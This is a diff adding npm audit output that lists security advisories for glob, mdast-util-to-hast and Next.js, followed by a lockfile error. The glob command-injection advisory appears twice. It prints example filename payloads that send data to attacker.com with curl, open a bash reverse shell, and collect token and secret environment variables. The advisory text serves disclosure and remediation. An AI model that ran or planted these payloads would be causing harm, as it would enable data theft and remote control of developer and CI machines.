+      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "reported_by": null,
+      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64756"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "glob",
+      "vulnerable_versions": ">=10.2.0 <10.5.0",
+      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
+      "recommendation": "Upgrade to version 10.5.0 or later",
+      "patched_versions": ">=10.5.0",
+      "updated": "2025-11-19T02:30:53.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    },
+    "1109843": {
+      "findings": [
+        {
+          "version": "11.0.2",
+          "paths": [
+            ".>glob"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
+      "created": "2025-11-17T17:38:56.000Z",
+      "id": 1109843,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "reported_by": null,
+      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64756"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "glob",
+      "vulnerable_versions": ">=11.0.0 <11.1.0",
+      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
+      "recommendation": "Upgrade to version 11.1.0 or later",
+      "patched_versions": ">=11.1.0",
+      "updated": "2025-11-19T02:30:53.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    },
+    "1111093": {
+      "findings": [
+        {
+          "version": "13.2.0",
+          "paths": [
+            ".>react-markdown>mdast-util-to-hast"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/syntax-tree/mdast-util-to-hast/security/advisories/GHSA-4fh9-h7wg-q85m\n- https://nvd.nist.gov/vuln/detail/CVE-2025-66400\n- https://github.com/syntax-tree/mdast-util-to-hast/commit/6fc783ae6abdeb798fd5a68e7f3f21411dde7403\n- https://github.com/syntax-tree/mdast-util-to-hast/commit/ab3a79570a1afbfa7efef5d4a0cd9b5caafbc5d7\n- https://github.com/advisories/GHSA-4fh9-h7wg-q85m",
+      "created": "2025-12-02T01:25:46.000Z",
+      "id": 1111093,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nMultiple (unprefixed) classnames could be added in markdown source by using character references.\nThis could make rendered user supplied markdown `code` elements appear like the rest of the page.\nThe following markdown:\n\n````markdown\n```js&#x20;xss\n```\n````\n\nWould create `<pre><code class=\"language-js xss\"></code></pre>`\nIf your page then applied `.xss` classes (or listeners in JS), those apply to this element.\nFor more info see <https://github.com/ChALkeR/notes/blob/master/Improper-markup-sanitization.md#unsanitized-class-attribute>\n\n### Patches\n\nThe bug was patched. When using regular semver, run `npm install`. For exact ranges, make sure to use `13.2.1`.\n\n### Workarounds\n\nUpdate.\n\n### References\n\n* bug introduced in https://github.com/syntax-tree/mdast-util-to-hast/commit/6fc783ae6abdeb798fd5a68e7f3f21411dde7403\n* bug fixed in https://github.com/syntax-tree/mdast-util-to-hast/commit/ab3a79570a1afbfa7efef5d4a0cd9b5caafbc5d7",
+      "reported_by": null,
+      "title": "mdast-util-to-hast has unsanitized class attribute",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-66400"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "mdast-util-to-hast",
+      "vulnerable_versions": ">=13.0.0 <13.2.1",
+      "github_advisory_id": "GHSA-4fh9-h7wg-q85m",
+      "recommendation": "Upgrade to version 13.2.1 or later",
+      "patched_versions": ">=13.2.1",
+      "updated": "2025-12-02T01:25:47.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-915"
+      ],
+      "url": "https://github.com/advisories/GHSA-4fh9-h7wg-q85m"
+    },
+    "1111377": {
+      "findings": [
+        {
+          "version": "15.4.8",
+          "paths": [
+            ".>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-w37m-7fhw-fmv9\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://www.cve.org/CVERecord?id=CVE-2025-55183\n- https://github.com/advisories/GHSA-w37m-7fhw-fmv9",
+      "created": "2025-12-11T22:49:56.000Z",
+      "id": 1111377,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55183](https://www.cve.org/CVERecord?id=CVE-2025-55183).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that can return the compiled source code of [Server Functions](https://react.dev/reference/rsc/server-functions). This could reveal business logic, but would not expose secrets unless they were hardcoded directly into [Server Function](https://react.dev/reference/rsc/server-functions) code.",
+      "reported_by": null,
+      "title": "Next Server Actions Source Code Exposure ",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.4.0-canary.0 <15.4.9",
+      "github_advisory_id": "GHSA-w37m-7fhw-fmv9",
+      "recommendation": "Upgrade to version 15.4.9 or later",
+      "patched_versions": ">=15.4.9",
+      "updated": "2025-12-11T22:49:56.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-497",
+        "CWE-502",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-w37m-7fhw-fmv9"
+    },
+    "1111386": {
+      "findings": [
+        {
+          "version": "15.4.8",
+          "paths": [
+            ".>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-mwv6-3258-q52c\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://www.cve.org/CVERecord?id=CVE-2025-55184\n- https://github.com/advisories/GHSA-mwv6-3258-q52c",
+      "created": "2025-12-11T22:49:27.000Z",
+      "id": 1111386,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55184](https://www.cve.org/CVERecord?id=CVE-2025-55184).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that, when deserialized, can cause the server process to hang and consume CPU. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next Vulnerable to Denial of Service with Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.4.0-canary.0 <15.4.9",
+      "github_advisory_id": "GHSA-mwv6-3258-q52c",
+      "recommendation": "Upgrade to version 15.4.9 or later",
+      "patched_versions": ">=15.4.9",
+      "updated": "2025-12-11T22:49:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-mwv6-3258-q52c"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 8,
+      "high": 3,
+      "critical": 1
+    },
+    "dependencies": 1248,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1248
+  }
+}
+npm error code ENOLOCK
+npm error audit This command requires an existing lockfile.
+npm error audit Try creating one first with: npm i --package-lock-only
+npm error audit Original error: loadVirtual requires existing shrinkwrap file
+{
+  "error": {
+    "code": "ENOLOCK",
+    "summary": "This command requires an existing lockfile.",
+    "detail": "Try creating one first with: npm i --package-lock-only\nOriginal error: loadVirtual requires existing shrinkwrap file"
+  }
+}
+npm error A complete log of this run can be found in: /Users/albsheralsadi/.npm/_logs/2025-12-13T03_57_38_408Z-debug-0.log
+done
